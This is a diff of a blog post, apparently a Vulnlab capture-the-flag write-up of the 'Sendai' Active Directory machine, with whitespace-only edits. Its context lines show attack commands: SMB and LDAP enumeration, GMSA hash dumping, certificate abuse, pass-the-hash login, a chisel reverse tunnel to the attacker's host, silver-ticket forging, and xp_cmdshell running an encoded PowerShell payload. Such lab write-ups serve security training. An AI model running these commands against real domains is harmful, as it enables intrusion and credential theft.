@@ -1,10 +1,10 @@
 ---
 
 layout: post
-title: VL Sendai (Machine medium) 
+title: VL Sendai (Machine medium)
 date: 29-07-2024
 categories: [documentation]
-tag: [Vulnlab, Machine, Active Directory, ADCS, ESC4, Silver Ticket]  
+tag: [Vulnlab, Machine, Active Directory, ADCS, ESC4, Silver Ticket]
 author: Ethicxz
 ---
 # Before Starting
@@ -36,7 +36,7 @@ PORT     STATE SERVICE
 We can try guest session on the smb for list users :
 
 ```bash
-cme smb 10.10.96.234 -u 'toto' -p ''                       SMB         10.10.96.234    445    
+cme smb 10.10.96.234 -u 'toto' -p ''                       SMB         10.10.96.234    445
 
 DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False)
 SMB         10.10.96.234    445    DC               [+] sendai.vl\toto:
@@ -189,12 +189,12 @@ Now do a bloodhound
 
 ```bash
 cme ldap 10.10.96.234 -u 'Thomas.Powell'  -p 'Toto01!' -k --bloodhound -ns 10.10.96.234 -c all
-``` 
+```
 ![alt text](../assets/image_sendai/3er.png)
 
 So Elliot.Yates is in SUPPORT@SENDAI.VL & SUPPORT@SENDAI.VL have GENERICALL on ADMSVC & ADMSVC can read GMSA password, so let's follow this path :
 
-## Getting mgtsvc$ 
+## Getting mgtsvc$
 
 ```bash
 # Add
@@ -215,7 +215,7 @@ LDAP        10.10.96.234    636    DC               [+] sendai.vl\Elliot.Yates:T
 LDAP        10.10.96.234    636    DC               [*] Getting GMSA Passwords
 LDAP        10.10.96.234    636    DC               Account: mgtsvc$              NTLM: 52ece1a97fb6c834236d7e9aa44c1a20
 ```
-Some links here for explanation : 
+Some links here for explanation :
 [https://www.thehacker.recipes/a-d/movement/dacl/addmember](https://www.thehacker.recipes/a-d/movement/dacl/addmember)
 
 [https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview](https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview)
@@ -282,7 +282,7 @@ certipy auth -pfx administrator.pfx -domain sendai.vl
 [*] Trying to retrieve NT hash for 'administrator'
 [*] Got hash for 'administrator@sendai.vl': aad3b435b51404eeaad3b435b51404ee:cf[...]7a
 ```
-Then we can evil-winrm 
+Then we can evil-winrm
 
 ```bash
 evil-winrm -u 'Administrator' -H 'cf[...]7a' -i 10.10.96.234
@@ -299,7 +299,7 @@ So as you can see when we had our first 2 users, it was possible to read in the 
 ```console
 Server=dc.sendai.vl,1433;Database=prod;User Id=sqlsvc;Password=SurenessBlob85;
 ```
-So we can use this to make a silver ticket 
+So we can use this to make a silver ticket
 
 [https://vulndev.io/2022/01/08/kerberos-silver-tickets/](https://vulndev.io/2022/01/08/kerberos-silver-tickets/)
 
@@ -311,7 +311,7 @@ chisel server -p 9999 --reverse
 # target machine
 ./chisel.exe client 10.8.2.163:9999 R:socks
 ```
-Now let's use ticketer to create a ticket 
+Now let's use ticketer to create a ticket
 
 ```bash
 ticketer.py -spn MSSQL/dc.sendai.vl -domain-sid S-1-5-21-3085872742-570972823-736764132 -nthash '58655C0B90B2492F84FB46FA78C2D96A' -dc-ip dc.sendai.vl Administrator -domain sendai
@@ -353,7 +353,7 @@ NULL
 
 > xp_cmdshell "powershell -e [JAB..AKQA=]"
 ```
-Now let's check the privileges 
+Now let's check the privileges
 
 ```powershell
 PS C:\> whoami /priv
